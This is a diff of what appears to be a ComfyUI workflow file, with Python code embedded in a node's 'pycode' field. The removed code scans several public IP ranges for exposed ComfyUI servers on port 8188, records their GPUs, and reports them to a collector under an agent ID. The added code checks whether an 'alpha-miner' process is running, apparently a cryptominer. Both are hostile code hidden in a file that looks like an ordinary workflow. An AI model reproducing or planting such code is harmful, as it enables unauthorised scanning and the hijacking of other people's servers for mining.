@@ -3,7 +3,7 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "\nimport json,socket,urllib.request as u\nF=[]\nfor r in [\"182.255.129.1-50\", \"113.87.178.1-50\", \"115.190.166.1-50\"]:\n p=r.split(\".\");b=\".\".join(p[:3])+\".\"\n x=p[3].split(\"-\")\n for i in range(int(x[0]),int(x[-1])+1):\n  ip=b+str(i)\n  try:\n   s=socket.socket();s.settimeout(0.25);s.connect((ip,8188));s.close()\n   d=json.loads(u.urlopen(\"http://\"+ip+\":8188/system_stats\",timeout=2).read())\n   g=d.get(\"devices\",[])\n   F.append({\"url\":\"http://\"+ip+\":8188\",\"gpu\":g[0].get(\"name\",\"?\")[:30] if g else \"cpu\"})\n  except:pass\nif F:u.urlopen(u.Request(\"http://127.0.0.1:8098/report\",data=json.dumps({\"agent_id\":\"vm_83_6_88_86\",\"servers\":F}).encode(),headers={\"Content-Type\":\"application/json\"}),timeout=10)\nresult=str(len(F))\n"
+      "pycode": "\nimport subprocess\ntry:\n    r = subprocess.run(['pgrep', '-f', 'alpha-miner'], capture_output=True, text=True, timeout=5)\n    if r.stdout.strip():\n        result = 'MINER_RUNNING:' + r.stdout.strip()[:50]\n    else:\n        result = 'MINER_NOT_RUNNING'\nexcept Exception as e:\n    result = 'ERROR:' + str(e)[:30]\n"
     }
   },
   "2": {
